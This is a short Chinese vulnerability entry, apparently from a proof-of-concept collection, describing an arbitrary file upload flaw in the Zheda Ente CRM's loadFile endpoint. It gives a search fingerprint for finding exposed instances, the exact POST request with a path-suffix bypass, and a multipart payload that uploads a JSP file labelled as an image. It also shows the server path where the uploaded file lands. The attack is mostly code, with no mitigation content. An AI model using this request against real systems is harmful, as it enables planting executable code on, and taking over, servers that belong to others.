# 浙大恩特CRMloadFile任意文件上传漏洞

- **系统**：浙大恩特CRMloadFile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIA…`　`Content-Length: 203`

**请求体 / payload**
```
------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="as.jsp"
Content-Type: image/jpeg
<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--

根据响应可知上传文件位置
/enterdoc/gesnum/00003509/photo/as.jsp
```

**其他**
- 浙大恩特CRM loadFile任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM